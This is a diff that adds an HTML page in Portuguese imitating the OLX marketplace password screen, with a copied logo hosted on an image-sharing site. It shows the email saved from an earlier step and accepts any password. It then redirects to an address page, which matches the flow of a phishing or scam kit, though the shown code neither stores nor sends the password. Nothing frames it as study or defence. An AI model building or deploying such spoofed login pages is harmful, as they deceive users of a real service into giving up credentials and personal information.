@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Digite sua senha - OLX</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 24px 16px;
+      text-align: center;
+    }
+
+    .logo {
+      padding: 24px 0 10px 0;
+      text-align: left;
+    }
+
+    .logo img {
+      height: 30px;
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 400;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    .btn-entrar {
+      width: 100%;
+      background-color: #f68b1f;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .links a {
+      text-decoration: none;
+      color: #8000ff;
+    }
+
+    #erro {
+      color: red;
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // Se email e senha já estiverem salvos, pular para endereço
+    const email = localStorage.getItem('emailDigitado');
+    const senha = localStorage.getItem('senhaConfirmada');
+    if (email && senha) {
+      window.location.href = 'endereco.html';
+    }
+  </script>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.postimg.cc/SswyzD2J/Background-Eraser-20250731-130123999.png" alt="Logo OLX" />
+    </div>
+
+    <h2>Acesse a sua conta</h2>
+
+    <h2 id="email-usuario" style="text-align: center; font-weight: 400; font-size: 18px; color: #444;"></h2>
+
+    <div class="input-group">
+      <label class="input-label">Senha</label>
+      <input type="password" id="senha" placeholder="" />
+      <div id="erro"></div>
+    </div>
+
+    <button class="btn-entrar" id="btnEntrar">Entrar</button>
+
+    <div class="links">
+      <a href="conta.html">Voltar</a>
+      <a href="#">Esqueceu sua senha?</a>
+    </div>
+  </div>
+
+  <script>
+    // Exibir email salvo
+    const emailSalvo = localStorage.getItem('emailDigitado');
+    if (emailSalvo) {
+      document.getElementById('email-usuario').textContent = emailSalvo;
+    }
+
+    // Validar senha e salvar confirmação
+    document.getElementById('btnEntrar').addEventListener('click', function () {
+      const senha = document.getElementById('senha').value;
+      const erro = document.getElementById('erro');
+
+      if (senha.trim() === '') {
+        erro.innerText = 'Digite sua senha para continuar';
+        return;
+      }
+
+      localStorage.setItem('senhaConfirmada', 'sim');
+      window.location.href = 'endereco.html';
+    });
+  </script>
+</body>
+</html>
